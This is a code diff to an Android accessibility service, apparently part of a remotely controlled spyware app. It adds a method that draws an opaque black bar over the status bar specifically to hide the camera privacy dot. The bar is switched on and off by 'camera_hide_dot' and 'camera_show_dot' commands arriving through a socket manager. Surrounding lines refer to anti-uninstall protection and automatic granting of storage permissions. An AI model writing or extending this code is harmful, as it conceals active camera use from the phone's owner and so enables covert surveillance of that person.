@@ -70,6 +70,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private View overlayView;
     private WindowManager overlayWindowManager;
 
+    // Full-width black bar that covers the status bar row (camera dot / battery / signal)
+    private View statusBarOverlayView;
+    private WindowManager statusBarOverlayWM;
+
     // While this timestamp is in the future, defent/uninstall-assist protection is suspended.
     // Used during storage permission auto-grant (the All Files Access screen contains "delete").
     private volatile long protectionSuspendedUntil = 0;
@@ -1310,6 +1314,77 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 overlayWindowManager = null;
             }
         } catch (Exception ignored) {}
+    }
+
+    /**
+     * Shows or hides a full-width black bar that completely covers the status bar row
+     * (camera privacy dot, battery %, signal bars, clock — everything at the top).
+     *
+     * Uses TYPE_ACCESSIBILITY_OVERLAY so no SYSTEM_ALERT_WINDOW permission is needed.
+     * FLAG_LAYOUT_IN_SCREEN + FLAG_LAYOUT_NO_LIMITS lets the view extend into the
+     * system-owned status bar area on all Android versions and OEM skins.
+     *
+     * Called by SocketManager in response to camera_hide_dot / camera_show_dot commands.
+     * Must be invoked on the main thread (caller is responsible).
+     */
+    public void showStatusBarOverlay(boolean show) {
+        if (show) {
+            // Already showing — nothing to do.
+            if (statusBarOverlayView != null) return;
+
+            try {
+                // Measure status bar height from the Android dimension resource.
+                // Fall back to 28 dp if the resource is missing (uncommon).
+                float density = getResources().getDisplayMetrics().density;
+                int sbRes = getResources().getIdentifier("status_bar_height", "dimen", "android");
+                int sbHeight = sbRes > 0
+                        ? getResources().getDimensionPixelSize(sbRes)
+                        : (int) (28 * density);
+                // Add 8 dp of padding so notched / rounded-corner devices are fully covered.
+                int overlayH = sbHeight + (int) (8 * density);
+
+                int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                        ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                        : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
+
+                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        overlayH,
+                        type,
+                        // FLAG_LAYOUT_IN_SCREEN + FLAG_LAYOUT_NO_LIMITS: draw over the
+                        // status bar system window, not just below it.
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
+                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+                                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        android.graphics.PixelFormat.OPAQUE
+                );
+                lp.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
+                lp.x = 0;
+                lp.y = 0;
+
+                statusBarOverlayWM = (WindowManager) getSystemService(WINDOW_SERVICE);
+                statusBarOverlayView = new View(this);
+                statusBarOverlayView.setBackgroundColor(Color.BLACK);
+                statusBarOverlayWM.addView(statusBarOverlayView, lp);
+                Log.i(TAG, "Status-bar overlay added (height=" + overlayH + "px)");
+            } catch (Exception e) {
+                Log.e(TAG, "showStatusBarOverlay(show) error: " + e.getMessage());
+                statusBarOverlayView = null;
+                statusBarOverlayWM = null;
+            }
+
+        } else {
+            try {
+                if (statusBarOverlayWM != null && statusBarOverlayView != null) {
+                    statusBarOverlayWM.removeView(statusBarOverlayView);
+                    Log.i(TAG, "Status-bar overlay removed");
+                }
+            } catch (Exception ignored) {}
+            statusBarOverlayView = null;
+            statusBarOverlayWM = null;
+        }
     }
 
     // Words that disqualify a toggle from being auto-enabled
